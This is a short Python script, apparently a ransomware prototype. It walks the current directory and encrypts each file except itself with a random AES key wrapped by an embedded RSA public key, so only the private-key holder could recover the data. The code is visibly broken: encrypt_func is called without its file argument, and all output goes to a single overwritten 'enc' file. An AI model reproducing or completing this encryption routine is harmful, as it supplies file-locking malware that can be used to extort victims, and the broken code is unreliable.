from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes 
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os
import sys


def encrypt_rsa(data,public_key):
    public_key = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(public_key)

    return cipher.encrypt(data)


def encrypt_aes(data,key):
    cipher = AES.new(key,AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext,tag = cipher.encrypt_and_digest(data)
    return(nonce,ciphertext)


def encrypt_func(file,public_key):
    with open (file,'rb') as file:
        file_content = file.read()
    

    key = get_random_bytes(32)

    nonce,enc_content = encrypt_aes(file_content,key)

    encrypted_key = encrypt_rsa(key,public_key)


    with open ('enc','wb') as enc_file:
        for data in (encrypted_key,nonce,enc_content):
            enc_file.write(data)
        

thisdir = os.getcwd()
file_name = os.path.basename(sys.argv[0])
for r,d,f in os.walk(thisdir):
                for file in f:
                        if file != file_name:
                            print(os.path.join(r,file))
                            try:        
                                    encrypt_func('''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoJ8h85o0x0t10bgkIxMq
QT5eAoDBu/fWE9zUgoqE6wR0l9hLMPIBmCeLPiCqbDM1h8ITO+RgJOELc8PHrV32
yIEfo1H4vgbZwNWexLW/yK7mTN9Y0UR1EXgyZlJC6naOaiwfaLsBOBQTkk6zLYTn
MWNTk3cyp8ah0p5DuIsor9+/ypjEvwHrpAkps+HuQlTQHYWVnpCBB/3yaKgM+OFt
WcdIPc6HWI7jJ9DbghQbyj8csK64Y8Y6o5zzhg/YYX6+M/sFT5PoeBv9Onthr9hp
TbR2cMhOVrq07WUeNvd0F7ZMxN11LoorMICBHVEfSTSLZc0rJMgh0PT+C5k01CPh
TQIDAQAB
-----END PUBLIC KEY-----''')
                            except Exception as e:
                                print(e)
                                     





